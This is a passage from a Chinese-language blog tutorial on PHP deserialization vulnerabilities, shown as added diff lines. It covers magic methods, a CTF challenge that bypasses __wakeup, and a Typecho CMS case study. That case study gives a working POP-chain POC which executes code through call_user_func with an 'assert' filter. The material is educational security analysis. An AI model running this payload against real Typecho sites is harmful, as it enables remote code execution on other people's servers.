+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($function,$parameters)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $function.<span class="string">"("</span>.$parameters.<span class="string">")"</span>.PHP_EOL;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"__call()"</span> . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line"><span class="keyword">echo</span> $ama666-&gt;notExistFunction(<span class="string">"patameters"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上代码，<code>__call()</code>函数被调用。也就是说，你想要调用方法未定义，那么这个方法名就会作为<code>__call</code>的第一个参数传入，而此不存在方法的参数会被装进数组中作为<code>__call</code>的第二个参数传入</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226114103.png" alt></p>
+<h4 id="2-2-7"><a href="#2-2-7" class="headerlink" title="2.2.7"></a>2.2.7</h4><p>当然PHP中还有很多<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>没有介绍，前面只说了我认为在反序列化漏洞中比较重要的几个，其他的大家有兴趣可以自己去了解。</p>
+<h2 id="CTF中的反序列化"><a href="#CTF中的反序列化" class="headerlink" title="CTF中的反序列化"></a>CTF中的反序列化</h2><h4 id="3-1-题目"><a href="#3-1-题目" class="headerlink" title="3.1 题目"></a>3.1 题目</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">            show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;     </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123; </span><br><span class="line">        show_source(<span class="string">'index.php'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </span><br><span class="line">       <span class="keyword">echo</span> unserialize($file ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>   <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-解答"><a href="#3-2-解答" class="headerlink" title="3.2 解答"></a>3.2 解答</h4><p>这道题利用的是PHP反序列化的一个特性，序列化字符串的结构在前面已经说过，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。此题的解题思路就是如此，通过改写序列化字符串中表示属性个数的数字，使其比真实值大，就可以跳过<code>__wakeup()</code>函数。</p>
+<h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">&#125;  </span><br><span class="line">$poc = <span class="keyword">new</span> SoFun;  </span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将输出的结果表示属性个数的数字加一</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">"*file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意提交的时候需要base64</p>
+<h2 id="CMS实战"><a href="#CMS实战" class="headerlink" title="CMS实战"></a>CMS实战</h2><p>选取的是<strong>typecho CMS</strong>进行实战演示。</p>
+<h4 id="4-1-CMS介绍"><a href="#4-1-CMS介绍" class="headerlink" title="4.1 CMS介绍"></a>4.1 CMS介绍</h4><p>Typecho基于PHP5开发，支持多种数据库，是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。</p>
+<h4 id="4-2-CMS安装"><a href="#4-2-CMS安装" class="headerlink" title="4.2 CMS安装"></a>4.2 CMS安装</h4><p>访问<code>install.php</code>按照网站提示安装即可</p>
+<h4 id="4-3-漏洞成因"><a href="#4-3-漏洞成因" class="headerlink" title="4.3 漏洞成因"></a>4.3 漏洞成因</h4><p>在根目录下的<code>install.php</code>文件第232行，调用了<strong>unserialize</strong>函数。传入参数是通过类方法获取的，跟进<code>Typecho_Cookie::get</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226142353.png" alt></p>
+<p>在文件<code>Cookie.php</code>中的第83行定义了类方法，功能为获取指定的Cookie值。第86行看出此值是从Cookie中获取，没有的话就从POST中获取，一步传入了unserialize函数，没有经过过滤，故而反序列化漏洞存在。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226143305.png" alt></p>
+<p>到此我们找到了输入点，但是具体能够执行什么类型的攻击以及攻击深度还要取决了类的作用域以及其中的函数。按照思路我们希望构造一个Typecho中已经存在的类，这个类要满足以下条件</p>
+<ul>
+<li>有魔法函数，能够在程序正常逻辑中自动执行</li>
+<li>魔法函数中存在敏感函数，通过向类属性注入可以代码可以被敏感函数执行，从而达到攻击效果。</li>
+</ul>
+<p>那么接下来的任务就是要寻找符合以上要求的类。首先<code>Typecho_Cookie</code>这个类是不符合要求的，在<code>install.php</code>文件中接着向下看，第234行实例化了<code>Typecho_Db</code>，跟进看一看这个类的定义。在文件<code>Db.php</code>中发现此类具有<code>__construct()</code>魔法函数，在此方法的第120行将传入的参数当作字符串进行拼接。传入的参数<code>$adapterName</code>如果是我们可控的参数的话，根据前面所讲，此过程会自动触发<code>__toString()</code>魔法函数。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226145159.png" alt></p>
+<p>回到上一层，也就是实例化<code>Typecho_Db</code>那里，看到<code>$adapterName</code>实际上就是<code>Typecho_Cookie</code>的一个类属性。而我们已知此类属性是可控的，那么下一步的目标就变成了</p>
+<ul>
+<li>找到一个类，其中含有<code>__toString()</code>魔法函数，能够在程序正常逻辑中自动执行</li>
+<li>此魔法函数中含有敏感函数可以被利用</li>
+</ul>
+<p>在<code>Feed.php</code>文件中找到了符合上述条件的类<code>Typecho_Feed</code>，其中<code>__toString()</code>方法中在第290行将<code>$item[&#39;author&#39;]-&gt;screenName</code>作为参数传递给了函数<strong>htmlspecialchars</strong>，前面讲过，当类试图访问一个不存在或者不可访问的对象是会触发<code>__get()</code>魔法函数。换句话说如果<code>$item[&#39;author&#39;]</code>是一个类且其中并不存在类属性<code>screenName</code>的话就会触发这个类(<code>$item[&#39;author&#39;]</code>)的<code>__get()</code>魔法函数。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226151635.png" alt></p>
+<p>现在我们的目标变成了</p>
+<ul>
+<li>找到一个类，其中含有<code>__get()</code>魔法函数，能够在程序正常逻辑中自动执行</li>
+<li>此魔法函数中含有敏感函数可以被利用</li>
+</ul>
+<p>在文件<code>Requests.php</code>文件中找到了符合要求的类<code>Typecho_Requests</code>，在文件第270行找到了<code>__get()</code>魔法函数</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190905.png" alt></p>
+<p>跟进函数<code>get</code>，注意此函数并非魔法函数，而是类方法。在文件的第296行找到了此函数的定义，此函数最后一行调用了<code>_applyFilter</code>函数，继续跟进，在文件第159行找到了此函数的定义，其中的第164行调用了<code>call_user_func</code>，是一个危险函数可以使用命令执行漏洞来攻击。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190933.png" alt></p>
+<p>到此为止我们从入口一路向下，终于找到了可以利用的敏感函数，总结回顾一下。</p>
+<ol>
+<li>反序列化Typecho_Cookie类方法获得的变量，此处为输入点，可以输入可控的序列化字符串</li>
+<li>实例化Typecho_Db，触发其中的construct魔法函数，其中有一段将类作为字符串拼接</li>
+<li>在Typecho_Feed类中找到toString魔法函数，其中有访问不可访问属性的操作</li>
+<li>在Typech_Requests类中找到get魔法函数，两步调用了call_user_func函数，可以命令执行</li>
+</ol>
+<p>根据pop链可以构造POC如下</p>
+<h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type=<span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'0'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'author'</span>=&gt; <span class="keyword">new</span> Typecho_Request())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line"><span class="string">'prefix'</span>=&gt;<span class="string">'typecho'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h4 id="5-1-过滤用户输入"><a href="#5-1-过滤用户输入" class="headerlink" title="5.1 过滤用户输入"></a>5.1 过滤用户输入</h4><p>可以维护一个黑名单或者白名单来限制用户的输入，过滤不合理，不符合程序逻辑的输入。</p>
+<h4 id="5-2-Java"><a href="#5-2-Java" class="headerlink" title="5.2 Java"></a>5.2 Java</h4><p>参考文章<a href="https://github.com/Cryin/Paper/blob/master/" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2020/01/12/反序列化详解-实战/" title="反序列化详解&实战">http://ama666.cn/2020/01/12/反序列化详解-实战/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/07/计算机视觉计算相机空间位置/" rel="next" title="计算机视觉计算相机空间位置">
+                <i class="fa fa-chevron-left"></i> 计算机视觉计算相机空间位置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/20/Hack-the-Box-Console/" rel="prev" title="Hack the Box-Console">
+                Hack the Box-Console <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-什么是反序列化漏洞"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 什么是反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-漏洞危害"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 漏洞危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-序列化与反序列化"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-序列化"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">2.1.1 序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-反序列化"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">2.1.2 反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-PHP魔法函数"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 PHP魔法函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-wakeup"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">2.2.1 __wakeup()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-2-destruct"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2.2.2 __destruct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-3-construct"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">2.2.3 __construct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-4-toString"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">2.2.4 __toString()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-5-get"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">2.2.5 __get()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-6-call"><span class="nav-number">1.2.2.6.</span> <span class="nav-text">2.2.6 __call()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-7"><span class="nav-number">1.2.2.7.</span> <span class="nav-text">2.2.7</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF中的反序列化"><span class="nav-number">1.3.</span> <span class="nav-text">CTF中的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-题目"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">3.1 题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-解答"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">3.2 解答</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#POC"><span class="nav-number">1.3.0.2.1.</span> <span class="nav-text">POC</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CMS实战"><span class="nav-number">1.4.</span> <span class="nav-text">CMS实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-CMS介绍"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">4.1 CMS介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-CMS安装"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">4.2 CMS安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-漏洞成因"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">4.3 漏洞成因</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#POC-1"><span class="nav-number">1.4.0.3.1.</span> <span class="nav-text">POC</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#防御方法"><span class="nav-number">1.5.</span> <span class="nav-text">防御方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-过滤用户输入"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">5.1 过滤用户输入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-Java"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">5.2 Java</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
